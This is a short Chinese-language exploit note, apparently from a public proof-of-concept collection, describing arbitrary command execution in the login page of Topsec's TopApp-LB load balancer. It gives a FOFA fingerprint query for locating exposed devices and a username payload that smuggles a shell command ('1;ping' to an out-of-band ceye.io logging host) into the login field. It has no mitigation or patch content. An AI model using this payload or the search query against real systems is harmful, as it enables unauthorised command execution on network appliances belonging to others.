# 天融信负载均衡TopApp-LB命令执行漏洞

## 漏洞描述

天融信负载均衡TopApp-LB系统存在任意命令执行

## 影响版本

天融信负载均衡TopApp-LB

## FOFA

> [!NOTE]
>
> app="天融信-TopApp-LB-负载均衡系统"

## 漏洞复现

登录界面中存在命令执行

账号:**1;ping 6km5dk.ceye.io;echo**

密码:**任意**

![](天融信负载均衡TopApp-LB命令执行漏洞.assets/1627363100819823.jpg)

成功收到请求

![](天融信负载均衡TopApp-LB命令执行漏洞.assets/1627363101005145.jpg)